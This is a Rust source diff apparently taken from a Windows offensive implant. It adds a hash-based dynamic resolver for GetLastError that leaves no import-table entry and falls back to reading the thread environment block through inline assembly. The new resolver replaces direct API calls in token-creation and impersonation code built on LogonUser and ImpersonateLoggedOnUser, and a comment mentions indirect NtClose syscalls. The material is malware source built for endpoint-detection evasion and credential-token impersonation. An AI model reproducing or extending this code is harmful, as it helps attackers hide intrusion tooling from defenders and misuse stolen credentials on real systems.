@@ -19,6 +19,29 @@ use winapi::um::winnt::{
 };
 // CloseHandle removed — using NtClose indirect syscall exclusively.
 
+/// Dynamically-resolved GetLastError (reads TEB, no IAT entry).
+#[cfg(windows)]
+unsafe fn get_last_error() -> u32 {
+    use std::sync::OnceLock;
+    static GET_LAST_ERROR: OnceLock<Option<unsafe extern "system" fn() -> u32>> = OnceLock::new();
+    let fn_ptr = GET_LAST_ERROR.get_or_init(|| {
+        let kernel32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+        let addr = pe_resolve::get_proc_address_by_hash(
+            kernel32,
+            pe_resolve::hash_str(b"GetLastError\0"),
+        )?;
+        Some(std::mem::transmute(addr))
+    });
+    if let Some(func) = fn_ptr {
+        func()
+    } else {
+        // Fallback: read TEB directly (x86_64 Windows)
+        let teb: *mut u8;
+        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        std::ptr::read_volatile(teb.add(0x68) as *const u32)
+    }
+}
+
 /// Stores the impersonation token so `Rev2Self` can close it.
 static SAVED_TOKEN: Mutex<Option<HANDLE>> = Mutex::new(None);
 
@@ -327,7 +350,7 @@ pub fn make_token(
     };
 
     if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+        let err = unsafe { get_last_error() };
         return Err(anyhow!("LogonUser failed with Win32 error {err}"));
     }
 
@@ -344,7 +367,7 @@ pub fn make_token(
 
     let ok = unsafe { impersonate(token) };
     let impersonate_result = if ok == 0 {
-        let err = unsafe { winapi::um::errhandlingapi::GetLastError() };
+        let err = unsafe { get_last_error() };
         Err(anyhow!("ImpersonateLoggedOnUser failed with Win32 error {err}"))
     } else {
         Ok(())
